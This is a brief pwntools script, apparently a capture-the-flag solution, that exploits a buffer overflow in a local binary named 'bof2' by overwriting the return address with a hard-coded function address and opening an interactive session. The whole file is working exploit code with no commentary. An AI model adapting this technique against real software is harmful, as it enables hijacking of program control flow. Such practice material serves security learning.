from pwn import *

r = process('./bof2')

raw_input()
magic = 0x00400697
magic1 = 0x004006ac
p = 'a' * 8 + '\0' * 8 + 'a' * 8 + p64(magic1)

r.recvuntil(';)\n')
r.send(p)

r.interactive()
